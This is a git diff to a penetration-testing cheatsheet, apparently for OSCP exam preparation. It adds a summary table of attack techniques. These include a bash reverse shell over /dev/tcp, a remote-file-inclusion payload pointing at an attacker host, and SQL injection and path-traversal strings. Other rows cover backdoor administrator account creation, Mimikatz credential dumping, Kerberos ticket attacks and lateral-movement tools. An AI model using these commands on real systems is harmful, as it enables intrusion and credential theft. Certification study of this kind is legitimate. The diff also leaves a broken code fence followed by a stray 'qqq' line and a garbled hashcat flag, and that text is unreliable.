@@ -1,11 +1,28 @@
-# OSCP Cheatsheet
+# OSCP CheatSheet
 
-**Prepared as part of my OSCP Preparation.**
+# Summary
 
-- Successfully passed the OSCP exam on May 20, 2024. Verify my achievement [here](https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b).
-- Feel free to open a pull request if you have any corrections, improvements, or new additions!
-- You can access my cheatsheet from here: https://s4thv1k.com/posts/oscp-cheatsheet/ as well!
-- Helped over 20 individuals in passing their exam:) Please let me know if this helped you too ❤️
+| **Category**             | **Focus**       | **Examples**                                                                                                                                                                                        |
+| ------------------------ | --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Windows Enumeration      | File locations  | NTUser.dat, php.ini, SAM, SYSTEM, Apache logs (access.log, error.log), MySQL logs (mysql.err, mysql.log), httpd.conf, boot.ini, global.asa, Unattended.xml, win.ini, etc.                           |
+| Linux Enumeration        | File locations  | /etc/passwd, /etc/shadow, /var/log/auth.log, /var/log/apache2/access.log, /root/.bash_history, ~/.ssh/id_rsa, /proc/cpuinfo, /etc/cron.deny, /etc/httpd/conf/httpd.conf, etc.                       |
+| File Search              | Key searches    | `findstr /si password *.xml`, `*.kdbx`, `*.ini`, `*.txt`, `*.config`, `*.log`, `grep -r password /etc`, `dir /s *pass*`, `Get-ChildItem -Include *.kdbx`                                            |
+| Git Recon                | Commands        | `git log`, `git show <commit-id>`, `git-dumper`, `.git` directory inspection, GitHub dorks, leaked credentials hunting                                                                              |
+| RDP                      | Connection      | `xfreerdp /u:uname /p:'pass' /v:IP`, `xfreerdp /d:domain /u:uname /p:'pass' /v:IP`, `xfreerdp /u:uname /p:'pass' /v:IP +clipboard`                                                                  |
+| SSH Access               | Key Setup       | `ssh-keygen -t rsa -b 4096`, upload `id_rsa.pub` to `~/.ssh/authorized_keys` on target, `chmod 700 ~/.ssh`, `chmod 600 ~/.ssh/authorized_keys`, `ssh user@target_ip`                                |
+| File Transfer            | Methods         | `nc <target_ip> 1234 < file`, `powershell Invoke-WebRequest`, `certutil -urlcache -split -f`, `wget <http://host/file`>, `impacket-smbserver <sharename> .`, `copy \\\\\\\\KaliIP\\\\share\\\\file` |
+| User Creation            | Windows/Linux   | `net user hacker hacker123 /add`, `net localgroup Administrators hacker /add`, `net localgroup "Remote Desktop Users" hacker /ADD`, `adduser <uname>`, `useradd <uname>`                            |
+| Password Cracking        | Tools           | `fcrackzip -u -D -p rockyou.txt file.zip`, `ssh2john id_rsa > hash`, `john hashfile --wordlist=rockyou.txt`, `hashcat -m <number> hash wordlist.txt --fofcrce`                                      |
+| Pivoting                 | Tools           | `ssh -D 9050`, `proxychains`, `chisel`, `ligolo-ng`, `ssh -L`, `ssh -R`, `ip tuntap add ligolo`, `sudo ip r add subnet dev ligolo`                                                                  |
+| Privilege Escalation     | Windows Tools   | `winPEAS`, `PowerUp.ps1`, `SharpGPOAbuse`, `PrintSpoofer`, `JuicyPotato`, `RoguePotato`, `SeImpersonatePrivilege`, `AlwaysInstallElevated`, `sc qc`, `sc config`, `icacls`                          |
+| Enumeration              | Services        | FTP: `ftp <IP>`, SSH: `ssh user@IP`, SMB: `smbclient`, HTTP: `dirsearch`, DNS: `dnsrecon`, SNMP: `snmpwalk`, NFS: `showmount`, RPC: `rpcclient`, HTTP/HTTPS fuzzing                                 |
+| Web Exploits             | Attacks         | LFI: `?page=../../etc/passwd`, RFI: `?page=http://attacker/file.php`, SQLi: `admin' or '1'='1`, Directory Traversal: `?file=../../boot.ini`, reverse shell via vulnerable forms                     |
+| Exploitation             | Reverse Shells  | `msfvenom`, `bash -i >& /dev/tcp/IP/PORT 0>&1`, `php -r '...', python reverse shell one-liner, Perl/Netcat shells, Groovy (Jenkins), war/jsp shells                                                 |
+| Post Exploitation        | Windows         | `Mimikatz sekurlsa::logonpasswords`, `dir /s *password*`, `SAM` + `SYSTEM` dump, `ConsoleHost_history.txt`, registry password search, `reg query`                                                   |
+| Active Directory Attacks | Tools           | `Rubeus`, `BloodHound`, `ldapdomaindump`, `crackmapexec`, `Sharphound.ps1`, `PowerView.ps1`, `AS-REP roast`, `Kerberoasting`, `DCSync`, `Golden/Silver tickets`, `gpp-decrypt`                      |
+| Ticket Attacks           | Kerberos        | `Rubeus asreproast`, `Rubeus kerberoast`, `kerberos::ptt`, `kerberos::golden`, `GetNPUsers.py`, `GetUserSPNs.py`, `hashcat -m 18200/13100`                                                          |
+| Lateral Movement         | Exec Methods    | `psexec.py`, `smbexec.py`, `wmiexec.py`, `atexec.py`, `winrs`, `Invoke-Command`, `DCom`, `PsExec`, `CrackMapExec -x`, `remote registry or service abuse`                                            |
+| Password Hunting         | Registry, files | `reg query HKLM /f password /t REG_SZ /s`, `reg query "HKLM\\\\\\\\...\\\\\\\\Winlogon"`, `unattend.xml`, `web.config`, `.vnc`, `.ini`, `ConsoleHost_history.txt`, `Putty sessions`, `SAM dump`     |
 
 # General
 
@@ -380,8 +397,8 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 2. In Linux
 ```bash
 find / -name *.kdbx 2>/dev/null
-```
-
+``
+qqq
 ### GitHub recon
 
 - You need to find traces of the `.git` files on the target machine.
